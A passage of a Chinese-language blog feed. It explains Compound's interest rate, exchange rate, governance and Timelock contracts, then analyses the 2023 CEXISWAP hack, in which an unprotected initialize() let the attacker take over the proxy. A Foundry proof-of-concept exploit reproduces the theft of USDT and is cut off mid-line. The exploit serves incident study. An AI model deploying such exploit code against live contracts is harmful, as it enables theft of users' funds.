baseRatePerBlock;</span><br><span class="line">       &#125; else &#123; </span><br><span class="line">       // 如果超过拐点，利率公式为 y = k2 * ( x - p ) + ( p * k + b)，即将拐点前后两部分分别计算后相加即可。</span><br><span class="line">       // b, k, k2, p 分别对应：baseRatePerBlock, multiplierPerBlock, jumpMultiplierPerBlock</span><br><span class="line">       // 即 jumpMultiplierPerBlock * ( util - kink ) + ( kink * multiplierPerBlock + baseRatePerBlock)</span><br><span class="line">       </span><br><span class="line">       // ( p * k + b ) kink前一部分是直线型利率</span><br><span class="line">           uint normalRate = ((kink * multiplierPerBlock) / BASE) + baseRatePerBlock;</span><br><span class="line">           // 超额利用率</span><br><span class="line">           uint excessUtil = util - kink;</span><br><span class="line">           // 多出 kink 的后一部分使用拐点斜率，两者相加</span><br><span class="line">           // 超额利用率 * 拐点后斜率 + 正常利率</span><br><span class="line">           return ((excessUtil * jumpMultiplierPerBlock) / BASE) + normalRate;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>借款利率的计算很简单。首先使用 <code>utilizationRate</code> 计算资金利用率：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function utilizationRate(uint cash, uint borrows, uint reserves) public pure returns (uint) &#123;</span><br><span class="line">    if (borrows == 0) return 0;</span><br><span class="line">    return borrows * BASE / (cash + borrows - reserves);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是计算一天的区块的利率，一天中的区块利润是单利的，而一年中的365天是复利的。按照一年2628000个区块，一天7200个区块进行计算得出：3.5%</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(13385436439 / 1e18 * 7200 + 1) ** 365 - 1</span><br><span class="line">0.03580119839257878 </span><br></pre></td></tr></table></figure><h4 id="存款利率-1"><a href="#存款利率-1" class="headerlink" title="存款利率"></a>存款利率</h4><p>存款利率是根据借款利率计算的，下面的代码翻译为：<code>存款利率 = 资金使用率 * 借款利率 *（1 - 储备金率）</code>。简单来说就是借款利息的一部分要分到储备金里进行储备。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function getSupplyRate(uint cash, uint borrows, uint reserves, uint reserveFactorMantissa) virtual override public view returns (uint) &#123;</span><br><span class="line">       uint oneMinusReserveFactor = BASE - reserveFactorMantissa;</span><br><span class="line">       uint borrowRate = getBorrowRateInternal(cash, borrows, reserves);</span><br><span class="line">       uint rateToPool = borrowRate * oneMinusReserveFactor / BASE;</span><br><span class="line">       return utilizationRate(cash, borrows, reserves) * rateToPool / BASE;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>计算增值的利息，见CToken.sol存款函数的<code>accrueInterest()</code></p><p>计算汇率</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @notice Calculates the exchange rate from the underlying to the CToken</span><br><span class="line"> * @dev This function does not accrue interest before calculating the exchange rate</span><br><span class="line"> * @return calculated exchange rate scaled by 1e18</span><br><span class="line"> */</span><br><span class="line">function exchangeRateStoredInternal() virtual internal view returns (uint) &#123;</span><br><span class="line">    uint _totalSupply = totalSupply;</span><br><span class="line">    if (_totalSupply == 0) &#123; // 如果没有token被mint过</span><br><span class="line">        return initialExchangeRateMantissa;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply</span><br><span class="line">        // 这里totalCash、totalBorrows都是以抵押品为单位的数量</span><br><span class="line">        // _totalSupply是以cToken为单位的数量</span><br><span class="line">        uint totalCash = getCashPrior();</span><br><span class="line">        uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;</span><br><span class="line">        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;</span><br><span class="line"></span><br><span class="line">        return exchangeRate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算借款金额</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 计算借款金额</span><br><span class="line">   function borrowBalanceStoredInternal(address account) internal view returns (uint) </span><br><span class="line">       BorrowSnapshot storage borrowSnapshot = accountBorrows[account];</span><br><span class="line"></span><br><span class="line">        // 如果借款金额是0，那么borrowIndex就应该是0，</span><br><span class="line">        // 但是除0会异常，因此这里直接返回0了</span><br><span class="line">       if (borrowSnapshot.principal == 0) &#123;</span><br><span class="line">           return 0;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // 计算新的借款金额</span><br><span class="line">       // recentBorrowBalance = borrower.borrowBalance * market.borrowIndex / borrower.borrowIndex</span><br><span class="line">       uint principalTimesIndex = borrowSnapshot.principal * borrowIndex;</span><br><span class="line">       return principalTimesIndex / borrowSnapshot.interestIndex;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="JumpRateModelV2"><a href="#JumpRateModelV2" class="headerlink" title="JumpRateModelV2"></a>JumpRateModelV2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">资金使用率没超过拐点值时，利率公式和直线型的一样：</span><br><span class="line">y = k*x + b</span><br><span class="line">而超过拐点之后，则利率公式将变成：</span><br><span class="line">y = k2*(x - p) + (k*p + b)</span><br></pre></td></tr></table></figure><p><code>k2</code> 表示拐点后的直线的斜率，简称为拐点直线斜率，<code>p</code> 表示拐点的 x 轴的值，也即拐点利用率，<code>x - p</code> 表示超额利用率，<code>k*p + b</code> 表示拐点时 y 的高度，简称拐点y 值。</p><p><code>JumpRateModelV2</code> 合约继承自 <code>BaseJumpRateModelV2</code> 合约，大部分操作由后者来完成。</p><h2 id="治理合约"><a href="#治理合约" class="headerlink" title="治理合约"></a>治理合约</h2><p>包括：Governance文件夹所有（Comp.sol、GovernorAlpha.sol等）、Timelock.sol</p><h3 id="Comp-sol"><a href="#Comp-sol" class="headerlink" title="Comp.sol"></a>Comp.sol</h3><p>除了正常的ERC20功能，魔改增加了投票功能</p><p>将自己的投票权委托给别人，可以委托给自己。最终的投票权=自己的COMP余额+委托的COMP金额</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function delegate(address delegatee) public &#123;</span><br><span class="line">    return _delegate(msg.sender, delegatee);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>投票权可以离线签名：EIP-712。expiry是签名到期时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function delegateBySig(address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s) public &#123;</span><br><span class="line">    bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));</span><br><span class="line">    bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry));</span><br><span class="line">    bytes32 digest = keccak256(abi.encodePacked(&quot;\x19\x01&quot;, domainSeparator, structHash));</span><br><span class="line">    address signatory = ecrecover(digest, v, r, s);</span><br><span class="line">    require(signatory != address(0), &quot;Comp::delegateBySig: invalid signature&quot;);</span><br><span class="line">    require(nonce == nonces[signatory]++, &quot;Comp::delegateBySig: invalid nonce&quot;);</span><br><span class="line">    require(block.timestamp &lt;= expiry, &quot;Comp::delegateBySig: signature expired&quot;);</span><br><span class="line">    return _delegate(signatory, delegatee);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取某用户的投票数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function getCurrentVotes(address account) external view returns (uint96) &#123;</span><br><span class="line">    uint32 nCheckpoints = numCheckpoints[account];</span><br><span class="line">    return nCheckpoints &gt; 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看某个用户在之前某个区块的获得的投票数额</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function getPriorVotes(address account, uint blockNumber) public view returns (uint96) &#123;.....&#125;</span><br></pre></td></tr></table></figure><h3 id="GovernorAlpha-sol"><a href="#GovernorAlpha-sol" class="headerlink" title="GovernorAlpha.sol"></a>GovernorAlpha.sol</h3><p>创建和执行提案的所有逻辑</p><h4 id="查看提案状态"><a href="#查看提案状态" class="headerlink" title="查看提案状态"></a>查看提案状态</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">enum ProposalState &#123;</span><br><span class="line">    Pending,</span><br><span class="line">    Active,</span><br><span class="line">    Canceled,</span><br><span class="line">    Defeated,</span><br><span class="line">    Succeeded,</span><br><span class="line">    Queued,</span><br><span class="line">    Expired,</span><br><span class="line">    Executed</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function state(uint proposalId) public view returns (ProposalState) &#123;</span><br><span class="line">    require(proposalCount &gt;= proposalId &amp;&amp; proposalId &gt; 0, &quot;GovernorAlpha::state: invalid proposal id&quot;);</span><br><span class="line">    Proposal storage proposal = proposals[proposalId];</span><br><span class="line">    if (proposal.canceled) &#123;</span><br><span class="line">        return ProposalState.Canceled;</span><br><span class="line">    &#125; else if (block.number &lt;= proposal.startBlock) &#123;</span><br><span class="line">        return ProposalState.Pending;</span><br><span class="line">    &#125; else if (block.number &lt;= proposal.endBlock) &#123;</span><br><span class="line">        return ProposalState.Active;</span><br><span class="line">    &#125; else if (proposal.forVotes &lt;= proposal.againstVotes || proposal.forVotes &lt; quorumVotes()) &#123;</span><br><span class="line">        return ProposalState.Defeated;</span><br><span class="line">    &#125; else if (proposal.eta == 0) &#123;</span><br><span class="line">        return ProposalState.Succeeded;</span><br><span class="line">    &#125; else if (proposal.executed) &#123;</span><br><span class="line">        return ProposalState.Executed;</span><br><span class="line">    &#125; else if (block.timestamp &gt;= add256(proposal.eta, timelock.GRACE_PERIOD())) &#123;</span><br><span class="line">        return ProposalState.Expired;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return ProposalState.Queued;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="发起提案"><a href="#发起提案" class="headerlink" title="发起提案"></a>发起提案</h4><ul><li>targets：执行此提案操作的合约地址</li><li>values：msg.value</li><li>signatures：调用啥方法，比如<code>transfer()</code></li><li>calldatas：执行方法的参数，比如上面<code>transfer()</code>函数中的参数内容</li><li>description：描述这个提案用来干啥的</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function propose(address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description) public returns (uint) &#123;.....&#125;</span><br></pre></td></tr></table></figure><h4 id="进行投票"><a href="#进行投票" class="headerlink" title="进行投票"></a>进行投票</h4><p>可以自己投票，也可以签名让别人投票</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function castVote(uint proposalId, bool support) public &#123;</span><br><span class="line">    return _castVote(msg.sender, proposalId, support);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function castVoteBySig(uint proposalId, bool support, uint8 v, bytes32 r, bytes32 s) public &#123;</span><br><span class="line">    bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));</span><br><span class="line">    bytes32 structHash = keccak256(abi.encode(BALLOT_TYPEHASH, proposalId, support));</span><br><span class="line">    bytes32 digest = keccak256(abi.encodePacked(&quot;\x19\x01&quot;, domainSeparator, structHash));</span><br><span class="line">    address signatory = ecrecover(digest, v, r, s);</span><br><span class="line">    require(signatory != address(0), &quot;GovernorAlpha::castVoteBySig: invalid signature&quot;);</span><br><span class="line">    return _castVote(signatory, proposalId, support);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="加入队列"><a href="#加入队列" class="headerlink" title="加入队列"></a>加入队列</h4><p>可以看出，只要提案投票通过，任何人都可以将提案加入到队列中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function queue(uint proposalId) public &#123;</span><br><span class="line">    require(state(proposalId) == ProposalState.Succeeded, &quot;GovernorAlpha::queue: proposal can only be queued if it is succeeded&quot;);</span><br><span class="line">    Proposal storage proposal = proposals[proposalId];</span><br><span class="line">    uint eta = add256(block.timestamp, timelock.delay());</span><br><span class="line">    for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;</span><br><span class="line">        _queueOrRevert(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], eta);</span><br><span class="line">    &#125;</span><br><span class="line">    proposal.eta = eta;</span><br><span class="line">    emit ProposalQueued(proposalId, eta);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="取消提案"><a href="#取消提案" class="headerlink" title="取消提案"></a>取消提案</h4><p>目前，仍然存在一个有权取消任何提案的监护人地址。它目前是由Compound Labs, Inc.自己持有。在未来，这个监护人地址可能会被删除。</p><p>在提案执行之前，提案的提出者可以取消此提案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function cancel(uint proposalId) public &#123;</span><br><span class="line">    ProposalState state = state(proposalId);</span><br><span class="line">    require(state != ProposalState.Executed, &quot;GovernorAlpha::cancel: cannot cancel executed proposal&quot;);</span><br><span class="line"></span><br><span class="line">    Proposal storage proposal = proposals[proposalId];</span><br><span class="line">    require(msg.sender == guardian || comp.getPriorVotes(proposal.proposer, sub256(block.number, 1)) &lt; proposalThreshold(), &quot;GovernorAlpha::cancel: proposer above threshold&quot;);</span><br><span class="line"></span><br><span class="line">    proposal.canceled = true;</span><br><span class="line">    for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;</span><br><span class="line">        timelock.cancelTransaction(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit ProposalCanceled(proposalId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="执行提案"><a href="#执行提案" class="headerlink" title="执行提案"></a>执行提案</h4><p>可以看出，只要排队完成，任何人都可以执行提案。提案的执行是将</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function execute(uint proposalId) public payable &#123;</span><br><span class="line">    require(state(proposalId) == ProposalState.Queued, &quot;GovernorAlpha::execute: proposal can only be executed if it is queued&quot;);</span><br><span class="line">    Proposal storage proposal = proposals[proposalId];</span><br><span class="line">    proposal.executed = true;</span><br><span class="line">    for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;</span><br><span class="line">        timelock.executeTransaction&#123;value: proposal.values[i]&#125;(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);</span><br><span class="line">    &#125;</span><br><span class="line">    emit ProposalExecuted(proposalId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这会跑到Timelock.sol执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function executeTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) public payable returns (bytes memory) &#123;</span><br><span class="line">    require(msg.sender == admin, &quot;Timelock::executeTransaction: Call must come from admin.&quot;);</span><br><span class="line"></span><br><span class="line">    bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));</span><br><span class="line">    require(queuedTransactions[txHash], &quot;Timelock::executeTransaction: Transaction hasn&#x27;t been queued.&quot;);</span><br><span class="line">    require(getBlockTimestamp() &gt;= eta, &quot;Timelock::executeTransaction: Transaction hasn&#x27;t surpassed time lock.&quot;);</span><br><span class="line">    require(getBlockTimestamp() &lt;= eta.add(GRACE_PERIOD), &quot;Timelock::executeTransaction: Transaction is stale.&quot;);</span><br><span class="line"></span><br><span class="line">    queuedTransactions[txHash] = false;</span><br><span class="line"></span><br><span class="line">    bytes memory callData;</span><br><span class="line"></span><br><span class="line">    if (bytes(signature).length == 0) &#123;</span><br><span class="line">        callData = data;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // solium-disable-next-line security/no-call-value</span><br><span class="line">    (bool success, bytes memory returnData) = target.call&#123;value: value&#125;(callData);</span><br><span class="line">    require(success, &quot;Timelock::executeTransaction: Transaction execution reverted.&quot;);</span><br><span class="line"></span><br><span class="line">    emit ExecuteTransaction(txHash, target, value, signature, data, eta);</span><br><span class="line"></span><br><span class="line">    return returnData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提案执行的逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bytes memory callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data);</span><br><span class="line">(bool success,) = target.call.value(value)(callData);</span><br></pre></td></tr></table></figure><h3 id="Timelock-sol"><a href="#Timelock-sol" class="headerlink" title="Timelock.sol"></a>Timelock.sol</h3><p>拥有管理员机制</p><h4 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h4><p>设置提案多久之后才能被投票、被加入队列、被执行等，目前设置为2天</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function setDelay(uint delay_) public &#123;</span><br><span class="line">    require(msg.sender == address(this), &quot;Timelock::setDelay: Call must come from Timelock.&quot;);</span><br><span class="line">    require(delay_ &gt;= MINIMUM_DELAY, &quot;Timelock::setDelay: Delay must exceed minimum delay.&quot;);</span><br><span class="line">    require(delay_ &lt;= MAXIMUM_DELAY, &quot;Timelock::setDelay: Delay must not exceed maximum delay.&quot;);</span><br><span class="line">    delay = delay_;</span><br><span class="line"></span><br><span class="line">    emit NewDelay(delay);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="队列-amp-交易"><a href="#队列-amp-交易" class="headerlink" title="队列&amp;交易"></a>队列&amp;交易</h4><p>主要有：<code>queueTransaction()</code>、<code>cancelTransaction()</code>、<code>executeTransaction()</code></p>]]></content>
      
      
      <categories>
          
          <category> 12.DeFi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>14.CEXISWAP@Incorrect-Access</title>
      <link href="/2023/11/19/08.PoC/14.CEXISWAP@Incorrect-Access/"/>
      <url>/2023/11/19/08.PoC/14.CEXISWAP@Incorrect-Access/</url>
      
        <content type="html"><![CDATA[<h1 id="CEXISWAP-Incorrect-Access"><a href="#CEXISWAP-Incorrect-Access" class="headerlink" title="CEXISWAP@Incorrect-Access"></a>CEXISWAP@Incorrect-Access</h1><ul><li>时间：2023-09-21 06:56:11 (UTC)</li><li>损失金额：$30,000 (30,000 USDT)</li><li>twitter：<a href="https://twitter.com/DecurityHQ/status/1704759560614126030">https://twitter.com/DecurityHQ/status/1704759560614126030</a></li></ul><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>黑客EOA：<a href="https://etherscan.io/address/0x060c169c4517d52c4be9a1dd53e41a3328d16f04">0x060C169C4517D52c4BE9a1Dd53e41a3328d16F04</a></li><li>黑客用来攻击的合约地址：<a href="https://etherscan.io/address/0x8c425ee62d18b65cc975767c27c42de548d133a1">0x8C425Ee62D18b65Cc975767C27c42dE548D133A1</a></li><li>被攻击的合约地址：<a href="https://etherscan.io/address/0xb8a5890d53df78dee6182a6c0968696e827e3305">0xb8a5890d53df78dee6182a6c0968696e827e3305</a></li><li>攻击事件hash：<a href="https://etherscan.io/tx/0xede72a74d8398875b42d92c550539d72c830d3c3271a7641ee1843dc105de59e">0xede72a74d8398875b42d92c550539d72c830d3c3271a7641ee1843dc105de59e</a></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p><img src="/2023/11/19/08.PoC/14.CEXISWAP@Incorrect-Access/image-20231119144401572.png" alt="image-20231119144401572"></p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p><img src="/2023/11/19/08.PoC/14.CEXISWAP@Incorrect-Access/image-20231119144457068.png" alt="image-20231119144457068"></p><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>攻击步骤就两个：调用<code>initialize()</code>和<code>upgradeToAndCall()</code>，很明显，<code>initialize()</code>是用来获取权限，然后<code>upgradeToAndCall()</code>是用权限来获利。</p><p>按道理，初始化函数应该只能调用一次，但是黑客看到了项目方调用了两次，如下图。那么猜测这个初始化函数是有问题的，不符合最佳实践。</p><p><img src="/2023/11/19/08.PoC/14.CEXISWAP@Incorrect-Access/image-20231119145634721.png" alt="image-20231119145634721"></p><p>那么这样就可以想一下，是否可以多次调用初始化函数呢？是否任何人都可以调用呢？事实上，任何人都可以调用，这个关键函数没做保护，只是没将合约开源而已。</p><p>拿到了权限，就可以调用<code>upgradeToAndCall()</code>进行获利。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC/tree/master/test">github</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract CexiTest is Test &#123;</span><br><span class="line">    ICEXISWAP private constant CEXISWAP =</span><br><span class="line">        ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);</span><br><span class="line">    IUSDT private constant USDT =</span><br><span class="line">        IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);</span><br><span class="line">    Exploiter private exploiter;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;mainnet&quot;, 18182605);</span><br><span class="line">        vm.label(address(CEXISWAP), &quot;CEXISWAP&quot;);</span><br><span class="line">        vm.label(address(USDT), &quot;USDT&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        exploiter = new Exploiter();</span><br><span class="line">        exploiter.exploit();</span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker USDT balance after exploit&quot;,</span><br><span class="line">            USDT.balanceOf(address(this)),</span><br><span class="line">            6</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploiter &#123;</span><br><span class="line">    ICEXISWAP private constant CEXISWAP =</span><br><span class="line">        ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);</span><br><span class="line">    IUSDT private constant USDT =</span><br><span class="line">        IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);</span><br><span class="line">    bytes32 private constant IMPLEMENTATION_SLOT =</span><br><span class="line">        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line">    address private immutable owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit() external &#123;</span><br><span class="line">        CEXISWAP.initialize(</span><br><span class="line">            &quot;HAX&quot;,</span><br><span class="line">            &quot;HAX&quot;,</span><br><span class="line">            address(this),</span><br><span class="line">            address(this),</span><br><span class="line">            address(this),</span><br><span class="line">            address(this)</span><br><span class="line">        );</span><br><span class="line">        CEXISWAP.upgradeToAndCall(</span><br><span class="line">            address(this),</span><br><span class="line">            abi.encodePacked(this.exploit2.selector)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // function 0x1de24bbf</span><br><span class="line">    function exploit2() external &#123;</span><br><span class="line">        // delegatecall</span><br><span class="line">        USDT.transfer(owner, 